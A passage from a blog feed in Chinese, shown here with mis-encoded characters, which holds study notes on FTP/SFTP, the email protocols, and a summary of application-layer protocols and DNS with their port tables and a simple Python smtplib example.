class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><hr><h2 id="Day-38-FTP-SFTPåè®®"><a href="#Day-38-FTP-SFTPåè®®" class="headerlink" title="Day 38: FTP&#x2F;SFTPåè®®"></a>Day 38: FTP&#x2F;SFTPåè®®</h2><p><strong>æ ¸å¿ƒå†…å®¹</strong>ï¼š</p><ul><li>FTPåè®®åŸç†</li><li>ä¸»åŠ¨æ¨¡å¼ vs è¢«åŠ¨æ¨¡å¼</li><li>SFTPï¼ˆSSHæ–‡ä»¶ä¼ è¾“ï¼‰</li><li>æ–‡ä»¶ä¼ è¾“å®ç°</li></ul><p><strong>FTPå·¥ä½œæ¨¡å¼</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ä¸»åŠ¨æ¨¡å¼ï¼ˆPORTï¼‰ï¼š<br>å®¢æˆ·ç«¯ â†’ æ§åˆ¶è¿æ¥ï¼ˆ21ç«¯å£ï¼‰â†’ æœåŠ¡å™¨<br>æœåŠ¡å™¨ â†’ æ•°æ®è¿æ¥ï¼ˆ20ç«¯å£ï¼‰â†’ å®¢æˆ·ç«¯<br><br>è¢«åŠ¨æ¨¡å¼ï¼ˆPASVï¼‰ï¼š<br>å®¢æˆ·ç«¯ â†’ æ§åˆ¶è¿æ¥ï¼ˆ21ç«¯å£ï¼‰â†’ æœåŠ¡å™¨<br>å®¢æˆ·ç«¯ â†’ æ•°æ®è¿æ¥ï¼ˆåŠ¨æ€ç«¯å£ï¼‰â†’ æœåŠ¡å™¨<br><br>SFTPï¼š<br><span class="hljs-bullet">- </span>åŸºäºSSHï¼ˆ22ç«¯å£ï¼‰<br><span class="hljs-bullet">- </span>åŠ å¯†ä¼ è¾“<br><span class="hljs-bullet">- </span>æ›´å®‰å…¨<br></code></pre></td></tr></table></figure><hr><h2 id="Day-39-SMTP-POP3-IMAPé‚®ä»¶åè®®"><a href="#Day-39-SMTP-POP3-IMAPé‚®ä»¶åè®®" class="headerlink" title="Day 39: SMTP&#x2F;POP3&#x2F;IMAPé‚®ä»¶åè®®"></a>Day 39: SMTP&#x2F;POP3&#x2F;IMAPé‚®ä»¶åè®®</h2><p><strong>æ ¸å¿ƒå†…å®¹</strong>ï¼š</p><ul><li>SMTPå‘é€é‚®ä»¶</li><li>POP3æ¥æ”¶é‚®ä»¶</li><li>IMAPé‚®ä»¶ç®¡ç†</li><li>é‚®ä»¶æ ¼å¼ï¼ˆMIMEï¼‰</li></ul><p><strong>åè®®å¯¹æ¯”</strong>ï¼š</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs tap">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ åè®®     â”‚ ç«¯å£ â”‚ ç”¨é€”       â”‚ ç‰¹ç‚¹     â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ SMTP     â”‚<span class="hljs-number"> 25 </span>  â”‚ å‘é€é‚®ä»¶   â”‚ æ¨é€åè®® â”‚<br>â”‚ POP3     â”‚<span class="hljs-number"> 110 </span> â”‚ æ¥æ”¶é‚®ä»¶   â”‚ ä¸‹è½½åˆ é™¤ â”‚<br>â”‚ IMAP     â”‚<span class="hljs-number"> 143 </span> â”‚ ç®¡ç†é‚®ä»¶   â”‚ æœåŠ¡å™¨å­˜ â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>SMTPæµç¨‹ï¼š<br>å®¢æˆ·ç«¯ â†’ SMTPæœåŠ¡å™¨ â†’ æ”¶ä»¶æœåŠ¡å™¨ â†’ æ”¶ä»¶äºº<br><br>POP3 vs IMAPï¼š<br>POP3: ä¸‹è½½åˆ°æœ¬åœ°ï¼ŒæœåŠ¡å™¨åˆ é™¤<br>IMAP: é‚®ä»¶ä¿ç•™åœ¨æœåŠ¡å™¨ï¼Œæ”¯æŒå¤šè®¾å¤‡åŒæ­¥<br></code></pre></td></tr></table></figure><p><strong>ä»£ç ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># SMTPå‘é€é‚®ä»¶</span><br><span class="hljs-keyword">import</span> smtplib<br><span class="hljs-keyword">from</span> email.mime.text <span class="hljs-keyword">import</span> MIMEText<br><br>msg = MIMEText(<span class="hljs-string">&#x27;é‚®ä»¶å†…å®¹&#x27;</span>)<br>msg[<span class="hljs-string">&#x27;Subject&#x27;</span>] = <span class="hljs-string">&#x27;ä¸»é¢˜&#x27;</span><br>msg[<span class="hljs-string">&#x27;From&#x27;</span>] = <span class="hljs-string">&#x27;sender@example.com&#x27;</span><br>msg[<span class="hljs-string">&#x27;To&#x27;</span>] = <span class="hljs-string">&#x27;receiver@example.com&#x27;</span><br><br>smtp = smtplib.SMTP(<span class="hljs-string">&#x27;smtp.example.com&#x27;</span>, <span class="hljs-number">25</span>)<br>smtp.send_message(msg)<br>smtp.quit()<br></code></pre></td></tr></table></figure><hr><h2 id="Day-40-åº”ç”¨å±‚åè®®æ€»ç»“"><a href="#Day-40-åº”ç”¨å±‚åè®®æ€»ç»“" class="headerlink" title="Day 40: åº”ç”¨å±‚åè®®æ€»ç»“"></a>Day 40: åº”ç”¨å±‚åè®®æ€»ç»“</h2><h3 id="å­¦è¿‡çš„åº”ç”¨å±‚åè®®æ€»ç»“"><a href="#å­¦è¿‡çš„åº”ç”¨å±‚åè®®æ€»ç»“" class="headerlink" title="å­¦è¿‡çš„åº”ç”¨å±‚åè®®æ€»ç»“"></a>å­¦è¿‡çš„åº”ç”¨å±‚åè®®æ€»ç»“</h3><p><strong>HTTPå®¶æ—</strong>ï¼š</p><ul><li>HTTP&#x2F;1.1: ä¼ ç»ŸWebåè®®</li><li>HTTP&#x2F;2: äºŒè¿›åˆ¶åˆ†å¸§ã€å¤šè·¯å¤ç”¨</li><li>HTTP&#x2F;3: åŸºäºQUICï¼Œ0-RTTè¿æ¥</li><li>HTTPS: TLSåŠ å¯†çš„HTTP</li><li>WebSocket: å…¨åŒå·¥å®æ—¶é€šä¿¡</li></ul><p><strong>DNS</strong>ï¼š</p><ul><li>åŸŸåè§£æ</li><li>é€’å½’æŸ¥è¯¢ vs è¿­ä»£æŸ¥è¯¢</li><li>DNSç¼“å­˜</li><li>DNSSECå®‰å…¨</li></ul><p><strong>é‚®ä»¶åè®®</strong>ï¼š</p><ul><li>SMTP: å‘é€é‚®ä»¶ï¼ˆ25, 587ï¼‰</li><li>POP3: æ¥æ”¶é‚®ä»¶ï¼ˆ110, 995ï¼‰</li><li>IMAP: ç®¡ç†é‚®ä»¶ï¼ˆ143, 993ï¼‰</li></ul><p><strong>æ–‡ä»¶ä¼ è¾“</strong>ï¼š</p><ul><li>FTP: æ–‡ä»¶ä¼ è¾“ï¼ˆ20, 21ï¼‰</li><li>SFTP: å®‰å…¨æ–‡ä»¶ä¼ è¾“ï¼ˆ22ï¼‰</li></ul><p><strong>å…¶ä»–</strong>ï¼š</p><ul><li>DHCP: è‡ªåŠ¨é…ç½®IPï¼ˆ67, 68ï¼‰</li><li>SSH: å®‰å…¨è¿œç¨‹ç™»å½•ï¼ˆ22ï¼‰</li><li>Telnet: è¿œç¨‹ç™»å½•ï¼ˆ23ï¼‰</li></ul><h3 id="åº”ç”¨å±‚åè®®è®¾è®¡æ¨¡å¼"><a href="#åº”ç”¨å±‚åè®®è®¾è®¡æ¨¡å¼" class="headerlink" title="åº”ç”¨å±‚åè®®è®¾è®¡æ¨¡å¼"></a>åº”ç”¨å±‚åè®®è®¾è®¡æ¨¡å¼</h3><p><strong>å®¢æˆ·ç«¯-æœåŠ¡å™¨æ¨¡å‹</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">å®¢æˆ·ç«¯ â†â†’ æœåŠ¡å™¨<br><span class="hljs-bullet">- </span>HTTP, FTP, SMTP, DNS<br><span class="hljs-bullet">- </span>æœåŠ¡å™¨æä¾›æœåŠ¡<br><span class="hljs-bullet">- </span>å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡<br></code></pre></td></tr></table></figure><p><strong>P2Pæ¨¡å‹</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">å¯¹ç­‰èŠ‚ç‚¹ â†â†’ å¯¹ç­‰èŠ‚ç‚¹<br><span class="hljs-bullet">- </span>BitTorrent<br><span class="hljs-bullet">- </span>æ¯ä¸ªèŠ‚ç‚¹æ—¢æ˜¯å®¢æˆ·ç«¯åˆæ˜¯æœåŠ¡å™¨<br></code></pre></td></tr></table></figure><h3 id="åè®®é€‰æ‹©æŒ‡å—"><a href="#åè®®é€‰æ‹©æŒ‡å—" class="headerlink" title="åè®®é€‰æ‹©æŒ‡å—"></a>åè®®é€‰æ‹©æŒ‡å—</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nix">åœºæ™¯          â†’ æ¨èåè®®<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br>ç½‘é¡µæµè§ˆ      â†’ HTTP<span class="hljs-symbol">/HTTPS</span><br>å®æ—¶é€šä¿¡      â†’ WebSocket<br>æ–‡ä»¶ä¼ è¾“      â†’ FTP<span class="hljs-symbol">/SFTP</span><br>é‚®ä»¶å‘é€      â†’ SMTP<br>é‚®ä»¶æ¥æ”¶      â†’ IMAPï¼ˆæ¨èï¼‰æˆ–POP3<br>åŸŸåè§£æ      â†’ DNS<br>è¿œç¨‹ç™»å½•      â†’ SSH<br>APIè®¾è®¡       â†’ RESTful over HTTP<br></code></pre></td></tr></table></figure><h3 id="æ€§èƒ½ä¼˜åŒ–æ€»ç»“"><a href="#æ€§èƒ½ä¼˜åŒ–æ€»ç»“" class="headerlink" title="æ€§èƒ½ä¼˜åŒ–æ€»ç»“"></a>æ€§èƒ½ä¼˜åŒ–æ€»ç»“</h3><p><strong>å‡å°‘å»¶è¿Ÿ</strong>ï¼š</p><ul><li>ä½¿ç”¨HTTP&#x2F;2æˆ–HTTP&#x2F;3</li><li>å¯ç”¨ç¼“å­˜</li><li>ä½¿ç”¨CDN</li><li>å‡å°‘å¾€è¿”æ¬¡æ•°</li></ul><p><strong>æé«˜å®‰å…¨æ€§</strong>ï¼š</p><ul><li>ä½¿ç”¨HTTPS&#x2F;TLS</li><li>å¯ç”¨DNSSEC</li><li>ä½¿ç”¨SFTPè€ŒéFTP</li><li>å®æ–½è®¤è¯å’Œæˆæƒ</li></ul><p><strong>æå‡å¯é æ€§</strong>ï¼š</p><ul><li>å®ç°é‡è¯•æœºåˆ¶</li><li>è¶…æ—¶æ§åˆ¶</li><li>é”™è¯¯å¤„ç†</li><li>å¥åº·æ£€æŸ¥</li></ul><hr><h2 id="ç¬¬å…­å‘¨å­¦ä¹ æˆæœ"><a href="#ç¬¬å…­å‘¨å­¦ä¹ æˆæœ" class="headerlink" title="ç¬¬å…­å‘¨å­¦ä¹ æˆæœ"></a>ç¬¬å…­å‘¨å­¦ä¹ æˆæœ</h2><h3 id="æŒæ¡çš„æŠ€èƒ½"><a href="#æŒæ¡çš„æŠ€èƒ½" class="headerlink" title="æŒæ¡çš„æŠ€èƒ½"></a>æŒæ¡çš„æŠ€èƒ½</h3><ul><li>âœ… æ·±å…¥ç†è§£DNSå·¥ä½œåŸç†</li><li>âœ… æŒæ¡é€’å½’å’Œè¿­ä»£æŸ¥è¯¢</li><li>âœ… äº†è§£DNSå®‰å…¨å¨èƒå’Œé˜²æŠ¤</li><li>âœ… ç†è§£é‚®ä»¶åè®®å·¥ä½œæµç¨‹</li><li>âœ… æŒæ¡æ–‡ä»¶ä¼ è¾“åè®®</li><li>âœ… èƒ½å¤Ÿå®ç°ç®€å•çš„åº”ç”¨å±‚åè®®</li></ul><h3 id="å®æˆ˜é¡¹ç›®"><a href="#å®æˆ˜é¡¹ç›®" class="headerlink" title="å®æˆ˜é¡¹ç›®"></a>å®æˆ˜é¡¹ç›®</h3><ol><li>DNSæŸ¥è¯¢å·¥å…·</li><li>DNSæœåŠ¡å™¨ï¼ˆç®€åŒ–ç‰ˆï¼‰</li><li>FTPå®¢æˆ·ç«¯</li><li>SMTPé‚®ä»¶å‘é€å·¥å…·</li></ol><h3 id="æ ¸å¿ƒçŸ¥è¯†ç‚¹"><a href="#æ ¸å¿ƒçŸ¥è¯†ç‚¹" class="headerlink" title="æ ¸å¿ƒçŸ¥è¯†ç‚¹"></a>æ ¸å¿ƒçŸ¥è¯†ç‚¹</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nix">åº”ç”¨å±‚åè®®æ ˆï¼š<br><br>åº”ç”¨å±‚<br>â”œâ”€â”€ HTTP<span class="hljs-symbol">/HTTPS</span> (Web)<br>â”œâ”€â”€ DNS (åŸŸåè§£æ)<br>â”œâ”€â”€ SMTP<span class="hljs-symbol">/POP3/IMAP</span> (é‚®ä»¶)<br>â”œâ”€â”€ FTP<span class="hljs-symbol">/SFTP</span> (æ–‡ä»¶ä¼ è¾“)<br>â””â”€â”€ SSH (è¿œç¨‹ç™»å½•)<br></code></pre></td></tr></table></figure><hr><h2 id="ä¸‹å‘¨é¢„å‘Š"><a href="#ä¸‹å‘¨é¢„å‘Š" class="headerlink" title="ä¸‹å‘¨é¢„å‘Š"></a>ä¸‹å‘¨é¢„å‘Š</h2><p><strong>ç¬¬ä¸ƒå‘¨ï¼šTCPæ·±å…¥åˆ†æï¼ˆDay 41-47ï¼‰</strong></p><p>ä¸»è¦å†…å®¹ï¼š</p><ul><li>Day 41: TCPä¸‰æ¬¡æ¡æ‰‹æ·±å…¥</li><li>Day 42: TCPå››æ¬¡æŒ¥æ‰‹å’ŒçŠ¶æ€æœº</li><li>Day 43: TCPæµé‡æ§åˆ¶ï¼ˆæ»‘åŠ¨çª—å£ï¼‰</li><li>Day 44: TCPæ‹¥å¡æ§åˆ¶ç®—æ³•</li><li>Day 45: TCPæ€§èƒ½ä¼˜åŒ–</li><li>Day 46: å®æˆ˜ï¼šTCPæ€§èƒ½æµ‹è¯•</li><li>Day 47: ç¬¬ä¸ƒå‘¨æ€»ç»“</li></ul><p>å­¦ä¹ é‡ç‚¹ï¼š</p><ul><li>æ·±å…¥ç†è§£TCPå¯é ä¼ è¾“æœºåˆ¶</li><li>æŒæ¡TCPæ€§èƒ½ä¼˜åŒ–æŠ€å·§</li><li>ç†è§£æ‹¥å¡æ§åˆ¶ç®—æ³•</li><li>åˆ†æTCPæ€§èƒ½ç“¶é¢ˆ</li></ul><hr><p><strong>è¿›åº¦ï¼š40&#x2F;120å¤©ï¼ˆ33.3%ï¼‰</strong></p><p>ç¬¬å…­å‘¨å®Œæˆï¼ä½ å·²ç»å®Œæˆäº†åº”ç”¨å±‚åè®®çš„å­¦ä¹ ã€‚</p><p>ä¸‹å‘¨æˆ‘ä»¬å°†æ·±å…¥ä¼ è¾“å±‚ï¼Œå­¦ä¹ TCPåè®®çš„é«˜çº§ç‰¹æ€§ï¼</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å…­å‘¨æ€»ç»“ï¼šDNSå’Œå…¶ä»–åº”ç”¨å±‚åè®®</title>
    <link href="/2025/11/10/%E5%85%AD%E5%91%A8%E6%80%BB%E7%BB%93%EF%BC%9ADNS%E5%92%8C%E5%85%B6%E4%BB%96%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE/"/>
    <url>/2025/11/10/%E5%85%AD%E5%91%A8%E6%80%BB%E7%BB%93%EF%BC%9ADNS%E5%92%8C%E5%85%B6%E4%BB%96%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬å…­å‘¨æ€»ç»“ï¼šDNSå’Œå…¶ä»–åº”ç”¨å±‚åè®®"><a href="#ç¬¬å…­å‘¨æ€»ç»“ï¼šDNSå’Œå…¶ä»–åº”ç”¨å±‚åè®®" class="headerlink" title="ç¬¬å…­å‘¨æ€»ç»“ï¼šDNSå’Œå…¶ä»–åº”ç”¨å±‚åè®®"></a>ç¬¬å…­å‘¨æ€»ç»“ï¼šDNSå’Œå…¶ä»–åº”ç”¨å±‚åè®®</h1><h2 id="æœ¬å‘¨å­¦ä¹ å†…å®¹"><a href="#æœ¬å‘¨å­¦ä¹ å†…å®¹" class="headerlink" title="æœ¬å‘¨å­¦ä¹ å†…å®¹"></a>æœ¬å‘¨å­¦ä¹ å†…å®¹</h2><h3 id="Day-35-DNSæ·±å…¥"><a href="#Day-35-DNSæ·±å…¥" class="headerlink" title="Day 35: DNSæ·±å…¥"></a>Day 35: DNSæ·±å…¥</h3><p><strong>æ ¸å¿ƒå†…å®¹</strong>ï¼š</p><ul><li>âœ… DNSå±‚çº§ç»“æ„ï¼ˆæ ¹â†’TLDâ†’æƒå¨ï¼‰</li><li>âœ… é€’å½’æŸ¥è¯¢ vs è¿­ä»£æŸ¥è¯¢</li><li>âœ… DNSè®°å½•ç±»å‹ï¼ˆA&#x2F;AAAA&#x2F;CNAME&#x2F;MX&#x2F;NSç­‰ï¼‰</li><li>âœ… DNSç¼“å­˜æœºåˆ¶å’ŒTTL</li><li>âœ… å®ç°DNSæŸ¥è¯¢å·¥å…·</li></ul><p><strong>å…³é”®çŸ¥è¯†ç‚¹</strong>ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss">DNSæŸ¥è¯¢æµç¨‹ï¼š<br>å®¢æˆ·ç«¯ â†’ æœ¬åœ°DNSï¼ˆé€’å½’ï¼‰<br>æœ¬åœ°DNS â†’ å…¶ä»–DNSï¼ˆè¿­ä»£ï¼‰<br>  â”œâ”€ æ ¹DNS<br>  â”œâ”€ TLD DNS (.com)<br>  â””â”€ æƒå¨DNS (example.com)<br><br>ç¼“å­˜å±‚çº§ï¼š<br>æµè§ˆå™¨ â†’ OS â†’ æœ¬åœ°DNS â†’ è¿œç¨‹DNS<br></code></pre></td></tr></table></figure><h3 id="Day-36-40-å…¶ä»–åº”ç”¨å±‚åè®®"><a href="#Day-36-40-å…¶ä»–åº”ç”¨å±‚åè®®" class="headerlink" title="Day 36-40: å…¶ä»–åº”ç”¨å±‚åè®®"></a>Day 36-40: å…¶ä»–åº”ç”¨å±‚åè®®</h3><p><strong>æ¶µç›–å†…å®¹</strong>ï¼š</p><ul><li>DNSå®‰å…¨ï¼ˆDNSSECã€DoHã€DoTï¼‰</li><li>FTP&#x2F;SFTPæ–‡ä»¶ä¼ è¾“</li><li>SMTP&#x2F;POP3&#x2F;IMAPé‚®ä»¶åè®®</li><li>åº”ç”¨å±‚åè®®æ€»ç»“</li></ul><hr><h2 id="æ ¸å¿ƒåè®®å¯¹æ¯”"><a href="#æ ¸å¿ƒåè®®å¯¹æ¯”" class="headerlink" title="æ ¸å¿ƒåè®®å¯¹æ¯”"></a>æ ¸å¿ƒåè®®å¯¹æ¯”</h2><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs tap">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ åè®®    â”‚ ç«¯å£ â”‚ ä¼ è¾“å±‚     â”‚ ä¸»è¦ç”¨é€”     â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ HTTP    â”‚<span class="hljs-number"> 80 </span>  â”‚ TCP        â”‚ Webæµè§ˆ      â”‚<br>â”‚ HTTPS   â”‚<span class="hljs-number"> 443 </span> â”‚ TCP+TLS    â”‚ å®‰å…¨Web      â”‚<br>â”‚ DNS     â”‚<span class="hljs-number"> 53 </span>  â”‚ UDP/TCP    â”‚ åŸŸåè§£æ     â”‚<br>â”‚ FTP     â”‚<span class="hljs-number"> 21 </span>  â”‚ TCP        â”‚ æ–‡ä»¶ä¼ è¾“     â”‚<br>â”‚ SFTP    â”‚<span class="hljs-number"> 22 </span>  â”‚ TCP+SSH    â”‚ å®‰å…¨æ–‡ä»¶ä¼ è¾“ â”‚<br>â”‚ SMTP    â”‚<span class="hljs-number"> 25 </span>  â”‚ TCP        â”‚ å‘é€é‚®ä»¶     â”‚<br>â”‚ POP3    â”‚<span class="hljs-number"> 110 </span> â”‚ TCP        â”‚ æ¥æ”¶é‚®ä»¶     â”‚<br>â”‚ IMAP    â”‚<span class="hljs-number"> 143 </span> â”‚ TCP        â”‚ ç®¡ç†é‚®ä»¶     â”‚<br>â”‚ SSH     â”‚<span class="hljs-number"> 22 </span>  â”‚ TCP        â”‚ è¿œç¨‹ç™»å½•     â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><hr><h2 id="å­¦ä¹ æˆæœ"><a href="#å­¦ä¹ æˆæœ" class="headerlink" title="å­¦ä¹ æˆæœ"></a>å­¦ä¹ æˆæœ</h2><h3 id="ç†è®ºçŸ¥è¯†"><a href="#ç†è®ºçŸ¥è¯†" class="headerlink" title="ç†è®ºçŸ¥è¯†"></a>ç†è®ºçŸ¥è¯†</h3><ul><li>âœ… ç†è§£DNSå®Œæ•´æŸ¥è¯¢æµç¨‹</li><li>âœ… æŒæ¡åº”ç”¨å±‚ä¸»è¦åè®®</li><li>âœ… äº†è§£åè®®å®‰å…¨æœºåˆ¶</li><li>âœ… ç†è§£ç¼“å­˜å’Œæ€§èƒ½ä¼˜åŒ–</li></ul><h3 id="ç¼–ç¨‹èƒ½åŠ›"><a href="#ç¼–ç¨‹èƒ½åŠ›" class="headerlink" title="ç¼–ç¨‹èƒ½åŠ›"></a>ç¼–ç¨‹èƒ½åŠ›</h3><ul><li>âœ… å®ç°DNSæŸ¥è¯¢å·¥å…·</li><li>âœ… æ„é€ å’Œè§£æDNSæŠ¥æ–‡</li><li>âœ… ä½¿ç”¨Pythonç½‘ç»œåº“</li><li>âœ… å¤„ç†äºŒè¿›åˆ¶åè®®</li></ul><h3 id="å®æˆ˜èƒ½åŠ›"><a href="#å®æˆ˜èƒ½åŠ›" class="headerlink" title="å®æˆ˜èƒ½åŠ›"></a>å®æˆ˜èƒ½åŠ›</h3><ul><li>âœ… èƒ½å¤Ÿè¯Šæ–­DNSé—®é¢˜</li><li>âœ… èƒ½å¤Ÿé€‰æ‹©åˆé€‚çš„åè®®</li><li>âœ… èƒ½å¤Ÿä¼˜åŒ–åº”ç”¨æ€§èƒ½</li><li>âœ… èƒ½å¤Ÿå®ç°ç®€å•åè®®</li></ul><hr><h2 id="é‡ç‚¹å›é¡¾"><a href="#é‡ç‚¹å›é¡¾" class="headerlink" title="é‡ç‚¹å›é¡¾"></a>é‡ç‚¹å›é¡¾</h2><h3 id="DNSæŸ¥è¯¢ç±»å‹"><a href="#DNSæŸ¥è¯¢ç±»å‹" class="headerlink" title="DNSæŸ¥è¯¢ç±»å‹"></a>DNSæŸ¥è¯¢ç±»å‹</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">é€’å½’æŸ¥è¯¢ï¼š<br><span class="hljs-bullet">- </span>å®¢æˆ·ç«¯é—®ä¸€æ¬¡<br><span class="hljs-bullet">- </span>DNSæœåŠ¡å™¨è´Ÿè´£å…¨éƒ¨æŸ¥è¯¢<br><span class="hljs-bullet">- </span>é€‚åˆå®¢æˆ·ç«¯<br><br>è¿­ä»£æŸ¥è¯¢ï¼š<br><span class="hljs-bullet">- </span>æ¯æ¬¡è¿”å›ä¸‹ä¸€æ­¥æŒ‡å¼•<br><span class="hljs-bullet">- </span>å®¢æˆ·ç«¯å¤šæ¬¡æŸ¥è¯¢<br><span class="hljs-bullet">- </span>å‡è½»æœåŠ¡å™¨è´Ÿæ‹…<br></code></pre></td></tr></table></figure><h3 id="DNSè®°å½•ç±»å‹"><a href="#DNSè®°å½•ç±»å‹" class="headerlink" title="DNSè®°å½•ç±»å‹"></a>DNSè®°å½•ç±»å‹</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-keyword">A</span>      â†’ IPv4åœ°å€<br><span class="hljs-keyword">AAAA</span>   â†’ IPv6åœ°å€<br><span class="hljs-keyword">CNAME</span>  â†’ åˆ«å<br><span class="hljs-keyword">MX</span>     â†’ é‚®ä»¶æœåŠ¡å™¨<br><span class="hljs-keyword">NS</span>     â†’ DNSæœåŠ¡å™¨<br><span class="hljs-keyword">TXT</span>    â†’ æ–‡æœ¬ä¿¡æ¯<br><span class="hljs-keyword">SOA</span>    â†’ æˆæƒä¿¡æ¯<br></code></pre></td></tr></table></figure><h3 id="åº”ç”¨å±‚è®¾è®¡æ¨¡å¼"><a href="#åº”ç”¨å±‚è®¾è®¡æ¨¡å¼" class="headerlink" title="åº”ç”¨å±‚è®¾è®¡æ¨¡å¼"></a>åº”ç”¨å±‚è®¾è®¡æ¨¡å¼</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> è¯·æ±‚-å“åº”æ¨¡å¼<br><span class="hljs-bullet">   -</span> HTTP, DNS, FTP<br>   <br><span class="hljs-bullet">2.</span> æ¨é€æ¨¡å¼<br><span class="hljs-bullet">   -</span> WebSocket, SMTP<br><br><span class="hljs-bullet">3.</span> è®¢é˜…-å‘å¸ƒæ¨¡å¼<br><span class="hljs-bullet">   -</span> MQTT, Redis Pub/Sub<br></code></pre></td></tr></table></figure><hr><h2 id="å¸¸è§é—®é¢˜è§£å†³"><a href="#å¸¸è§é—®é¢˜è§£å†³" class="headerlink" 